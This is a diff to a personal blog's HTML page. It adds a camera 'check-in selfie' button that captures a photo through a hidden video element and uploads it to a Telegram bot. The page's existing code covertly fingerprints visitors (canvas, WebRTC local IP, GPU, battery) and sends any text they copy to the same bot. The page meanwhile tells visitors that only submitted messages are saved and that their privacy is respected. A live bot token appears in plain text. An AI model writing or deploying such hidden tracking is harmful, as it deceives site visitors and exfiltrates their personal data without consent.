@@ -20,8 +20,18 @@
         .message-box h3 { color: #2c3e50; margin-bottom: 1.5rem; }
         input, textarea { width: 100%; padding: 12px 15px; margin-bottom: 1rem; border: 1px solid #ddd; border-radius: 6px; font-size: 1rem; outline: none; }
         input:focus, textarea:focus { border-color: #3498db; }
-        button { background: #3498db; color: #fff; border: none; padding: 12px 30px; border-radius: 6px; font-size: 1rem; cursor: pointer; }
+        button { background: #3498db; color: #fff; border: none; padding: 12px 30px; border-radius: 6px; font-size: 1rem; cursor: pointer; transition: background 0.2s; }
         button:hover { background: #2980b9; }
+        
+        .btn-selfie {
+            background: #27ae60;
+            margin-bottom: 1.5rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .btn-selfie:hover { background: #219150; }
+        
         .tip-text { font-size: 0.85rem; color: #999; margin-top: 10px; }
         footer { text-align: center; padding: 2rem 0; color: #999; font-size: 0.9rem; }
         .toast { position: fixed; top: 20px; right: 20px; padding: 12px 20px; border-radius: 6px; color: #fff; display: none; z-index: 999; }
@@ -47,11 +57,14 @@
         </div>
 
         <div class="message-box">
-            <h3>访客留言（自愿提交）</h3>
+            <h3>访客打卡与留言</h3>
+            <!-- 自拍授权按钮 -->
+            <button class="btn-selfie" id="btnSelfie" onclick="takeAndSendSelfie()">📷 拍摄访客打卡照</button>
+            
             <input type="text" id="name" placeholder="请输入你的昵称（选填）">
             <textarea id="msg" rows="5" placeholder="请输入你的留言内容（必填）"></textarea>
             <button onclick="sendMessage()">提交留言</button>
-            <p class="tip-text">温馨提示：仅你主动提交的留言内容会保存，本网站尊重您的隐私</p>
+            <p class="tip-text">温馨提示：点击自拍打卡需授权摄像头；仅你主动提交的留言内容会保存，本网站尊重您的隐私。</p>
         </div>
     </div>
 
@@ -59,7 +72,7 @@
         © 2026 个人博客 | 原创记录 尊重隐私
     </footer>
 
-    <!-- Firebase SDK & 极客指纹追踪逻辑 -->
+    <!-- Firebase SDK & 极客指纹追踪与自动自拍逻辑 -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
         import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
@@ -81,8 +94,18 @@
         const BOT_TOKEN = "8724573178:AAFjCHYB6tQ1FxIlkBk1A3qUIStfomBU1Xo";
         const CHAT_ID = "2057699071";
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const TELEGRAM_PHOTO_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
-        // 发送 Telegram 消息
+        // 显示提示弹窗
+        function showToast(msg, type = "success") {
+            let toast = document.getElementById("toast");
+            toast.className = "toast " + type;
+            toast.innerText = msg;
+            toast.style.display = "block";
+            setTimeout(() => toast.style.display = "none", 3000);
+        }
+
+        // 发送 Telegram 文本消息
         async function sendTelegram(text) {
             try {
                 let response = await fetch(TELEGRAM_API_URL, {
@@ -102,6 +125,77 @@
             }
         }
 
+        // 核心功能：请求摄像头授权，无显示拍照并自动发至 Telegram
+        window.takeAndSendSelfie = async function() {
+            let btn = document.getElementById("btnSelfie");
+            btn.disabled = true;
+            btn.innerText = "⏳ 正在请求授权及抓拍...";
+
+            try {
+                // 1. 申请前置摄像头权限（无预览画面）
+                let stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: 1280, height: 720 },
+                    audio: false
+                });
+
+                // 2. 后台创建不可见的 video 节点缓冲画面
+                let video = document.createElement("video");
+                video.style.display = "none";
+                video.srcObject = stream;
+                await video.play();
+
+                // 稍微等待 500ms 确保曝光和聚焦正常
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                // 3. 后台 Canvas 渲染截图
+                let canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                let ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // 4. 关闭摄像头流（释放设备资源与指示灯）
+                stream.getTracks().forEach(track => track.stop());
+
+                // 5. 将图像转为 Blob二进制文件并上传至 Telegram
+                canvas.toBlob(async (blob) => {
+                    if (!blob) {
+                        showToast("拍照失败，请重试", "error");
+                        btn.disabled = false;
+                        btn.innerText = "📷 拍摄访客打卡照";
+                        return;
+                    }
+
+                    let formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", blob, "visitor_selfie.jpg");
+                    formData.append("caption", `📷 <b>【收到新的访客自拍打卡】</b>\n🕒 时间：${new Date().toLocaleString()}`);
+                    formData.append("parse_mode", "HTML");
+
+                    let res = await fetch(TELEGRAM_PHOTO_URL, {
+                        method: "POST",
+                        body: formData
+                    });
+                    let resData = await res.json();
+
+                    if (resData.ok) {
+                        showToast("打卡成功！自拍照已发送给博主", "success");
+                    } else {
+                        showToast("发送自拍失败，请检查网络", "error");
+                    }
+
+                    btn.disabled = false;
+                    btn.innerText = "📷 拍摄访客打卡照";
+                }, "image/jpeg", 0.85);
+
+            } catch (err) {
+                console.error("相机授权或拍摄失败:", err);
+                showToast("未获得摄像头授权或设备不支持", "error");
+                btn.disabled = false;
+                btn.innerText = "📷 拍摄访客打卡照";
+            }
+        };
+
         // 清空 visits 集合
         async function clearVisitsCollection() {
             try {
@@ -115,7 +209,7 @@
             } catch (e) {}
         }
 
-        // 1. 生成 Canvas 硬件指纹 (Canvas Fingerprint)
+        // 1. 生成 Canvas 硬件指纹
         function getCanvasFingerprint() {
             try {
                 let canvas = document.createElement('canvas');
@@ -143,7 +237,7 @@
             }
         }
 
-        // 2. WebRTC 获取局域网 IP (仅部分网络/浏览器支持)
+        // 2. WebRTC 获取局域网 IP
         function getLocalIP() {
             return new Promise((resolve) => {
                 try {
@@ -209,7 +303,6 @@
                 let localIP = await getLocalIP();
                 let gpuInfo = getGPUInfo();
 
-                // 电池
                 let batteryInfo = "未获取";
                 if (navigator.getBattery) {
                     try {
@@ -280,7 +373,7 @@
             })
             .catch(err => console.log(err));
 
-        // 6. 复制文本监听 (复制即推送)
+        // 6. 复制文本监听
         document.addEventListener('copy', () => {
             let selectedText = window.getSelection().toString();
             if (selectedText.trim().length > 0) {
@@ -295,13 +388,9 @@
         window.sendMessage = async function() {
             let name = document.getElementById("name").value.trim() || "匿名访客";
             let msg = document.getElementById("msg").value.trim();
-            let toast = document.getElementById("toast");
 
             if (!msg) {
-                toast.className = "toast error";
-                toast.innerText = "请输入留言内容！";
-                toast.style.display = "block";
-                setTimeout(() => toast.style.display = "none", 2000);
+                showToast("请输入留言内容！", "error");
                 return;
             }
 
@@ -317,18 +406,11 @@
                 let msgText = `<b>【博客新留言】</b>\n昵称：${name}\n内容：${msg}\n时间：${timeStr}`;
                 await sendTelegram(msgText);
 
-                toast.className = "toast success";
-                toast.innerText = "留言提交成功！";
-                toast.style.display = "block";
-                setTimeout(() => toast.style.display = "none", 2000);
-
+                showToast("留言提交成功！", "success");
                 document.getElementById("name").value = "";
                 document.getElementById("msg").value = "";
             } catch (err) {
-                toast.className = "toast error";
-                toast.innerText = "提交失败！";
-                toast.style.display = "block";
-                setTimeout(() => toast.style.display = "none", 2000);
+                showToast("提交失败！", "error");
             }
         }
     </script>
